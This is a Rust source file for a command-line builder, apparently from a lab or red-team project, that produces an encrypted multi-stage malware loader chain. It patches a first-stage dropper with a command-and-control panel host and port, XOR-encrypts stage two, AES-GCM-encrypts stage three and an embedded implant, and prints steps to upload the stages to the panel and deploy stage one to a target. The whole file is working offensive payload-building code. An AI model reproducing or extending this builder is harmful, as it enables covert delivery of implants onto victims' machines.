//! Oxide Builder CLI
//!
//! Generates encrypted loader chain payloads:
//! - Patches Stage 1 with config (host, port, XOR key)
//! - Encrypts Stage 2 with XOR
//! - Encrypts Stage 3 with AES-GCM
//! - Encrypts implant for embedding in Stage 3
//!
//! Usage:
//!   oxide-builder chain --host 10.10.100.10 --port 8080 --output ./build/
//!   oxide-builder stage1 --template stage1/build/stage1 --host ... --output stage1.bin
//!   oxide-builder stage2 --input stage2.bin --key <hex> --output stage2.enc
//!   oxide-builder stage3 --input stage3.bin --psk <psk> --salt <hex> --output stage3.enc

mod constants;
mod crypto;
mod stage1_builder;
mod stage2_builder;
mod stage3_builder;

use anyhow::{Context, Result};
use clap::{Parser, Subcommand};
use std::fs;
use std::path::PathBuf;

#[derive(Parser)]
#[command(name = "oxide-builder")]
#[command(author = "diemoeve")]
#[command(version = "0.1.0")]
#[command(about = "Build encrypted oxide loader chain payloads")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Build complete loader chain
    Chain {
        /// Panel host
        #[arg(long)]
        host: String,

        /// Panel port
        #[arg(long, default_value = "8080")]
        port: u16,

        /// Pre-shared key for AES encryption
        #[arg(long, default_value = "oxide-lab-psk")]
        psk: String,

        /// Stage 1 template binary
        #[arg(long, default_value = "stage1/build/stage1")]
        stage1_template: PathBuf,

        /// Stage 2 binary
        #[arg(long, default_value = "stage2/target/release/stage2")]
        stage2_binary: PathBuf,

        /// Stage 3 binary
        #[arg(long, default_value = "stage3/target/release/stage3")]
        stage3_binary: PathBuf,

        /// Output directory
        #[arg(long, short, default_value = "./build")]
        output: PathBuf,
    },

    /// Build Stage 1 only
    Stage1 {
        /// Template binary path
        #[arg(long)]
        template: PathBuf,

        /// Panel host
        #[arg(long)]
        host: String,

        /// Panel port
        #[arg(long, default_value = "8080")]
        port: u16,

        /// Stage number to fetch (2 or 3)
        #[arg(long, default_value = "2")]
        stage: u16,

        /// XOR key (hex encoded)
        #[arg(long)]
        key: Option<String>,

        /// Output path
        #[arg(long, short)]
        output: PathBuf,
    },

    /// Encrypt Stage 2
    Stage2 {
        /// Input binary path
        #[arg(long, short)]
        input: PathBuf,

        /// XOR key (hex encoded)
        #[arg(long)]
        key: String,

        /// Output path
        #[arg(long, short)]
        output: PathBuf,
    },

    /// Encrypt Stage 3
    Stage3 {
        /// Input binary path
        #[arg(long, short)]
        input: PathBuf,

        /// Pre-shared key
        #[arg(long)]
        psk: String,

        /// Salt (hex encoded)
        #[arg(long)]
        salt: String,

        /// Output path
        #[arg(long, short)]
        output: PathBuf,
    },

    /// Encrypt implant for Stage 3
    Implant {
        /// Input implant binary
        #[arg(long, short)]
        input: PathBuf,

        /// Pre-shared key
        #[arg(long)]
        psk: String,

        /// Salt (hex encoded)
        #[arg(long)]
        salt: String,

        /// Output path
        #[arg(long, short)]
        output: PathBuf,
    },

    /// Generate random keys/salt
    Keygen {
        /// Key type: xor, salt, or all
        #[arg(long, default_value = "all")]
        key_type: String,

        /// XOR key length (for xor type)
        #[arg(long, default_value = "16")]
        xor_len: usize,
    },
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    match cli.command {
        Commands::Chain {
            host,
            port,
            psk,
            stage1_template,
            stage2_binary,
            stage3_binary,
            output,
        } => {
            build_chain(&host, port, &psk, &stage1_template, &stage2_binary, &stage3_binary, &output)?;
        }

        Commands::Stage1 {
            template,
            host,
            port,
            stage,
            key,
            output,
        } => {
            let xor_key = match key {
                Some(hex_key) => hex::decode(&hex_key).context("Invalid hex key")?,
                None => crypto::generate_xor_key(16),
            };
            stage1_builder::build_stage1(&template, &output, &host, port, stage, &xor_key)?;
            println!("Stage 1 built: {}", output.display());
            println!("XOR key: {}", hex::encode(&xor_key));
        }

        Commands::Stage2 { input, key, output } => {
            let xor_key = hex::decode(&key).context("Invalid hex key")?;
            stage2_builder::build_stage2(&input, &output, &xor_key)?;
            println!("Stage 2 encrypted: {}", output.display());
        }

        Commands::Stage3 { input, psk, salt, output } => {
            let salt_bytes = hex::decode(&salt).context("Invalid hex salt")?;
            stage3_builder::build_stage3(&input, &output, &psk, &salt_bytes)?;
            println!("Stage 3 encrypted: {}", output.display());
        }

        Commands::Implant { input, psk, salt, output } => {
            let salt_bytes = hex::decode(&salt).context("Invalid hex salt")?;
            stage3_builder::encrypt_implant(&input, &output, &psk, &salt_bytes)?;
            println!("Implant encrypted: {}", output.display());
        }

        Commands::Keygen { key_type, xor_len } => {
            match key_type.as_str() {
                "xor" => {
                    let key = crypto::generate_xor_key(xor_len);
                    println!("XOR key ({} bytes): {}", xor_len, hex::encode(&key));
                }
                "salt" => {
                    let salt = crypto::generate_salt();
                    println!("Salt (32 bytes): {}", hex::encode(salt));
                }
                "all" | _ => {
                    let xor_key = crypto::generate_xor_key(xor_len);
                    let salt = crypto::generate_salt();
                    println!("XOR key ({} bytes): {}", xor_len, hex::encode(&xor_key));
                    println!("Salt (32 bytes): {}", hex::encode(salt));
                }
            }
        }
    }

    Ok(())
}

/// Build complete loader chain.
fn build_chain(
    host: &str,
    port: u16,
    psk: &str,
    stage1_template: &PathBuf,
    stage2_binary: &PathBuf,
    stage3_binary: &PathBuf,
    output_dir: &PathBuf,
) -> Result<()> {
    // Create output directory
    fs::create_dir_all(output_dir)
        .with_context(|| format!("Failed to create output dir: {}", output_dir.display()))?;

    // Generate keys
    let xor_key = crypto::generate_xor_key(16);
    let salt = crypto::generate_salt();

    println!("Building loader chain...");
    println!("  Host: {}:{}", host, port);
    println!("  PSK: {}", psk);
    println!("  XOR key: {}", hex::encode(&xor_key));
    println!("  Salt: {}", hex::encode(salt));
    println!();

    // Build Stage 1 (patched with config)
    let stage1_out = output_dir.join("stage1");
    stage1_builder::build_stage1(stage1_template, &stage1_out, host, port, 2, &xor_key)?;
    println!("Stage 1: {}", stage1_out.display());

    // Encrypt Stage 2 (XOR)
    let stage2_out = output_dir.join("stage2.enc");
    stage2_builder::build_stage2(stage2_binary, &stage2_out, &xor_key)?;
    println!("Stage 2: {}", stage2_out.display());

    // Encrypt Stage 3 (AES-GCM)
    let stage3_out = output_dir.join("stage3.enc");
    stage3_builder::build_stage3(stage3_binary, &stage3_out, psk, &salt)?;
    println!("Stage 3: {}", stage3_out.display());

    // Write config file for reference
    let config = serde_json::json!({
        "host": host,
        "port": port,
        "psk": psk,
        "xor_key": hex::encode(&xor_key),
        "salt": hex::encode(salt),
        "stage1": stage1_out.file_name().unwrap().to_str().unwrap(),
        "stage2": "stage2.enc",
        "stage3": "stage3.enc",
    });

    let config_path = output_dir.join("chain.json");
    fs::write(&config_path, serde_json::to_string_pretty(&config)?)?;
    println!("Config: {}", config_path.display());

    println!();
    println!("Chain built successfully!");
    println!();
    println!("Deployment:");
    println!("  1. Upload stage2.enc to panel: POST /api/staging/upload (stage_number=2)");
    println!("  2. Upload stage3.enc to panel: POST /api/staging/upload (stage_number=3)");
    println!("  3. Deploy stage1 to target");

    Ok(())
}
